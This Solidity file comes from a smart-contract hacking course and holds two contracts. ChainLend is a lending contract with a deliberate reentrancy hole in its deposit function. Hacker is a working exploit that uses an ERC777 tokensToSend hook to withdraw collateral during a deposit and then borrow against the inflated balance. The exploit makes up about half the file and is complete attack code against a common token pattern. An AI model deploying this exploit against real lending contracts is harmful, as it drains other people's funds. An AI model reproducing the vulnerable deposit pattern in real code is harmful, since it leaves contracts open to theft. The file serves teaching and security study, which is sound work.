// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "hardhat/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

/**
 * @title ChainLend
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract ChainLend {
  // Deposit token is imBTC, borrow token is USDC
  IERC20 public depositToken;
  IERC20 public borrowToken;
  mapping(address => uint256) public deposits;
  mapping(address => uint256) public debt;

  constructor(address _depositToken, address _borrowToken) {
    depositToken = IERC20(_depositToken);
    borrowToken = IERC20(_borrowToken);
  }

  function deposit(uint256 amount) public {
    uint256 deposited = deposits[msg.sender];
    depositToken.transferFrom(msg.sender, address(this), amount);
    deposits[msg.sender] = deposited + amount;
    console.log(
      "Chainled thinks that you have %s btc after deposit function ends",
      deposits[msg.sender]
    );
  }

  // Can only be called if the debt is repayed
  function withdraw(uint256 amount) public {
    uint256 deposited = deposits[msg.sender];
    require(
      debt[msg.sender] <= 0,
      "Please clear your debt to Withdraw Collateral"
    );
    require(amount <= deposited, "Withdraw Limit Exceeded");

    deposits[msg.sender] = deposited - amount;
    depositToken.transfer(msg.sender, amount);
  }

  // Assuming correct prices and oracles are in place to calculate the correct borrow limit
  // For smplicity purposes, setting the imBTC oracle price to 20,000 USDC for 1 imBTC.
  function borrow(uint256 amount) public {
    uint256 deposited = deposits[msg.sender];
    uint256 borrowed = debt[msg.sender];
    require(deposited > 0, "You need to deposit before borrowing");

    // BorrowLimit is deposited balance by caller multiplied with the price of imBTC,
    // and then dividing it by 1e8 because USDC decimals is 6 while imBTC is 8
    uint256 borrowLimit = (deposited * 20_000 * 1e6) / 1e8;
    // Finally allowing only 80% of the deposited balance to be borrowed (80% Loan to value)
    borrowLimit = ((borrowLimit * 80) / 100) - borrowed;
    require(amount <= borrowLimit, "BorrowLimit Exceeded");

    debt[msg.sender] += amount;
    borrowToken.transfer(msg.sender, amount);
    console.log(
      "You borrow succefully %s USDC",
      borrowToken.balanceOf(msg.sender)
    );
    console.log(
      "Chainled thinks that you have %s btc after borrow function ends",
      deposits[msg.sender]
    );
  }

  function repay(uint256 amount) public {
    require(debt[msg.sender] > 0, "You don't have any debt");
    require(
      amount <= debt[msg.sender],
      "Amount to high! You don't have that much debt"
    );

    borrowToken.transferFrom(msg.sender, address(this), amount);
    debt[msg.sender] -= amount;
  }
}

contract Hacker {
  ChainLend chainLend;
  address payable owner;
  uint16 counter;

  IERC1820Registry private constant _erc1820 =
    IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

  constructor(address _chainLend) {
    chainLend = ChainLend(_chainLend);
    _erc1820.setInterfaceImplementer(
      address(this),
      keccak256("ERC777TokensSender"),
      address(this)
    );
    owner = payable(msg.sender);
    chainLend.depositToken().approve(address(chainLend), 10000000000000);
  }

  function tokensToSend(
    address operator,
    address from,
    address to,
    uint256 amount,
    bytes calldata data,
    bytes calldata operatorData
  ) external {
    counter++;
    console.log("Go thought the Fallback for the %s Time", counter);
    if (counter % 2 == 0) {
      chainLend.withdraw(99999999);
      console.log(
        "Hacker imBTC balance is: %s",
        chainLend.depositToken().balanceOf(address(this))
      );
    } else {
      // chainLend.withdraw(1);
    }
  }

  function attackDeposit() public {
    chainLend.deposit(99999999);
    chainLend.deposit(1);
    chainLend.withdraw(1);
  }

  function borrow() public {
    chainLend.borrow(1000000 * 1e6);
    // chainLend.borrowToken().transfer(owner, )
    chainLend.withdraw(100000000);
  }
}
